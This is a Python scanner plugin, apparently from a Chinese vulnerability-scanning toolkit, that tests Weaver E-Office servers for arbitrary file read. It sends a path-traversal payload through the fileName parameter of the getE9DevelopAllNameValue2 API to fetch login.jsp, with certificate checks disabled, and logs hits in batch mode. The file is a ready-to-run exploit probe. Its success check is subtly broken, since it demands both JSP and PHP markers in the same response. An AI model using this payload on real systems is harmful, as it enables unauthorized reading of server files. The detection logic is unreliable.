# app="泛微-EOffice"
import requests,re,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class GetE9DevelopAllNameValue2_file_read_Scan:
	def scan(self,baseurl):
		url = baseurl + '/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../../../login/login.jsp'
		try:
			response = requests.get(url, verify=self.ssl,headers=self.headers,proxies=self.proxy, timeout=15)
			if '<%@' in response.text and response.status_code == 200:
				if response.status_code == 200 and '<?php' in response.text:
					OutPrintInfoSuc("FanWei", f'存在FanWei任意文件读取{url}')
					if self.batch:
						OutPutFile("fanwei_db_info.txt", f'存在FanWei任意文件读取{url}')
				else:
					if not self.batch:
						OutPrintInfo("FanWei", '不存在FanWei任意文件读取')

		except Exception:
			if not self.batch:
				OutPrintInfo("FanWei", '目标请求出错')

	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		header = target["header"]
		proxy = target["proxy"]
		self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("FanWei", '开始执行FanWei任意文件读取检测...')
		self.scan(url)
		if not self.batch:
			OutPrintInfo("FanWei", 'FanWei任意文件读取检测结束')
